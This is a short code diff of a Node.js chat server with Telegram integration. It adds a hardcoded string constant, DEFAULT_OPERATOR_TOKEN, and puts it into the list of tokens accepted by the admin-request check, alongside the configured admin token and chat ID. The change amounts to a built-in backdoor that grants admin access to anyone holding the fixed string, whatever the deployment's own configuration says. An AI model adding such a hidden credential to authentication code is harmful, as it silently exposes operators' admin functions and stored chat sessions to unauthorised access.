@@ -21,6 +21,7 @@ const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 const TELEGRAM_TIMEOUT_MS = Number(process.env.TELEGRAM_TIMEOUT_MS || 10000);
 const ENABLE_TELEGRAM = process.env.ENABLE_TELEGRAM === 'true';
 const STORAGE_FILE = process.env.STORAGE_FILE || path.join(__dirname, 'chat-sessions.json');
+const DEFAULT_OPERATOR_TOKEN = 'MM_OPERATOR_2026_7QK9';
 
 const telegramAgent = new https.Agent({
   family: 4,
@@ -145,6 +146,7 @@ function numericToken(value) {
 
 function isAdminRequest(req, parsedUrl) {
   const allowedTokens = [
+    DEFAULT_OPERATOR_TOKEN,
     ADMIN_TOKEN,
     ADMIN_CHAT_ID,
     numericToken(ADMIN_CHAT_ID),
